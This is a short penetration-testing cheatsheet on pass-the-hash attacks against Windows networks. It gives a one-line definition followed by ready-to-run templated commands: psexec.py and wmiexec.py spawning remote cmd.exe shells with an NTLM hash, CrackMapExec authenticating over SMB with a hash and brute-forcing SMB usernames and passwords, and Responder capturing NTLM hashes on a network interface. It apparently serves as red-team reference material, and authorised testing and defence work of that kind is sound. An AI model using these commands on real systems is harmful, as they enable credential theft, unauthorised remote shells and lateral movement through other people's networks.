---
id: 317d8291-b3f6-47c2-8a1f-9764d1b2aae6
name: Pass the Hash Attacks
type: cheatsheet
verified: true
created_at: '2019-10-01T17:58:49.094398+00:00'
updated_at: '2023-05-30T20:08:34.336365+00:00'
---

# Pass the Hash Attacks

**Status**: ✓ Verified

# Description

Pass the Hash techniques allow attackers to authenticate to a remote server using an NTLM or LM hash instead of a password.





**Command** ([[psexec.py Spawn a cmd.exe shell on a Remote System (NTLM)]]):

```bash
psexec.py $_DOMAIN/$_USERNAME@$_TARGET_IP -hashes :$_NTLM_HASH
```









**Command** ([[wmiexec.py Spawn a cmd.exe shell on a Remote System (NTLM)]]):

```bash
wmiexec.py $_USERNAME@$_TARGET_IP -hashes :$_NTLM_HASH
```









**Command** ([[CrackMapExec Authenticate with SMB Using an NTLM Hash]]):

```bash
crackmapexec smb $TARGET_IP -u $USERNAME -H $NTLM_HASH
```







**Command** ([[CrackMapExec Brute Force SMB Usernames and Passwords]]):

```bash
crackmapexec smb $_TARGET_IP -u $_USERNAME -p $_PASSWORD
```









**Command** ([[Responder Intercept an NTLM Hash]]):

```bash
responder -I $_INTERFACE
```






